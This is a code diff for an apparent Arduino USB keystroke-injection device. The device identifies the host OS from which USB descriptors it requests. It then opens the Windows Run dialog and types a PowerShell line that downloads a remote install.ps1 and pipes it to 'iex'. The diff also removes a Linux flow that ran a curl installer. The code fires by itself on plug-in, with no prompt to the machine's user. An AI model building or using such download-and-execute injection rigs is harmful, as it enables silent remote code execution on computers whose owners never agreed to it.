@@ -25,17 +25,21 @@
 class OSDetect : public PluggableUSBModule {
 public:
     volatile bool windows = false;
-    volatile bool linux   = false;
     OSDetect() : PluggableUSBModule(0, 0, NULL) { PluggableUSB().plug(this); }
 protected:
     bool setup(USBSetup&) { return false; }
     int  getInterface(uint8_t*) { return 0; }
     int  getDescriptor(USBSetup& s) {
-        /* Windows uniquely requests the MS OS String Descriptor (STRING 0xEE). */
+        /* Two Windows tells, either one is enough:
+         *  - STRING 0xEE (MS OS String Descriptor): only on the FIRST enumeration
+         *    of a given VID/PID/bcdDevice -- Windows caches the result and never
+         *    re-requests it, so this alone fails on re-plug.
+         *  - DEVICE_QUALIFIER (type 0x06): Windows requests it on EVERY
+         *    enumeration; macOS never does (both confirmed empirically -- the
+         *    board reads MAC on macOS and WINDOWS on Windows). This is what makes
+         *    Windows detection survive the 0xEE cache on re-plug. */
         if (s.wValueH == 3 && s.wValueL == 0xEE) windows = true;
-        /* Linux probes the DEVICE_QUALIFIER descriptor (type 0x06); macOS never
-         * does (confirmed by capture). Checked after Windows, which wins. */
-        if (s.wValueH == 6) linux = true;
+        if (s.wValueH == 6)                      windows = true;
         return 0;   /* not handled -- let the core continue normally */
     }
 };
@@ -61,17 +65,13 @@ static void type_str(const char *s)
 /* ---- per-OS flows ----------------------------------------------------- */
 static void do_windows(void)
 {
-    combo(KEY_LEFT_GUI, 'r');        delay(700);    /* Run dialog */
-    run_line("powershell");          delay(1600);   /* PowerShell window */
-    run_line(WIN_CMD);                              /* installs; `exit` closes it */
-}
-
-static void do_linux(void)
-{
-    /* Ctrl+Alt+T opens a terminal on most Linux desktops (GNOME, XFCE, ...).
-     * Not universal across every DE, but the common default. */
-    combo3(KEY_LEFT_CTRL, KEY_LEFT_ALT, 't'); delay(1600);
-    run_line(NIX_CMD);   /* same curl installer; get.sh detects Linux by uname */
+    /* Type the WHOLE command into the Run dialog: powershell -Command "<installer>".
+     * Run launches PowerShell already carrying the command, so there is no
+     * fragile second typing into a not-yet-ready console (that race left an
+     * empty PowerShell window). PowerShell runs -Command and the window closes
+     * on its own when it finishes. */
+    combo(KEY_LEFT_GUI, 'r');   delay(1500);   /* Run dialog (auto-selects old text) */
+    run_line("powershell -NoProfile -Command \"iwr -useb " MEOW_URL "/install.ps1 | iex\"");
 }
 
 static void do_mac(void)
@@ -92,12 +92,9 @@ static void do_mac(void)
     combo(KEY_LEFT_GUI, 'w');
 }
 
-/* Windows wins over Linux wins over macOS (Windows may also probe 0x06). */
 static const __FlashStringHelper* detected_os(void)
 {
-    if (osdetect.windows) return F("WINDOWS");
-    if (osdetect.linux)   return F("LINUX");
-    return F("MAC/other");
+    return osdetect.windows ? F("WINDOWS") : F("MAC/other");
 }
 
 void setup(void)
@@ -125,9 +122,8 @@ void setup(void)
         delay(400);
     }
 
-    if      (osdetect.windows) do_windows();
-    else if (osdetect.linux)   do_linux();
-    else                       do_mac();
+    if (osdetect.windows) do_windows();
+    else                  do_mac();
 }
 
 void loop(void) { }
